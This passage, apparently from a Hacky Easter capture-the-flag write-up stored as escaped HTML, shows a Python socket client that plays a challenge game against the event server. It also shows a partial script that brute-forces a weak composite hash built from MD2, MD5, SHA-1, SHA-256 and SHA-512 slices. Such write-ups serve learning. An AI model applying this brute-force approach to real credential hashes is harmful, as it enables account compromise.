    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(challs[chall]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\r&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;netcat&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port):&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;global&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM)&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;connect((hostname,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;port))&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;recv(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1024&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Received:&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;repr(data)&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Speechless?&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;or&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Go play with your toys, yellow-belly.&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;):&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;break&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Do you feel brave enough to challenge the mighty nerdmaster? (y|n)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;y&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;.*YOUR TURN ----&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;keys()[random&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;randint(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;len(tosends)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)]&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sendall(chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;send challenge: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;tosends&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;removekey(tosends,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;



        &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;re&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;search(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;.*MY TURN ----&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n(.*)&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;n&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data)&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m:&lt;/span&gt;
            &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;groups()[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;keys():&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;sendchall(s,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;chal)&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;
                &lt;span style=&#34;color: #f8f8f2&#34;&gt;challs[chal]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
                &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;continue&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;::::::&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;data&lt;/span&gt;


    &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connection closed.&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;close()&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;nc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;netcat(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;hackyeaster.hacking-lab.com&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;1400&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-24:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 24&lt;/h1&gt;

&lt;p&gt;Hrm, this really isn&amp;rsquo;t a secure hash at all. A Python script can do this&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Crypto.Hash&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD2,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD5,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA256,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA512&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;itertools&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;string&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;os&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sys&lt;/span&gt;


&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD2&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] First part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;MD5&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Second part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Third part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_4&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA256&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;hexdigest()&lt;/span&gt;

        &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;hashed[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;target[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]:&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[*] Fourth part is:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;part_5&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;():&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;gen:&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;join(p)&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;new()&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;update(word)&lt;/span&gt;
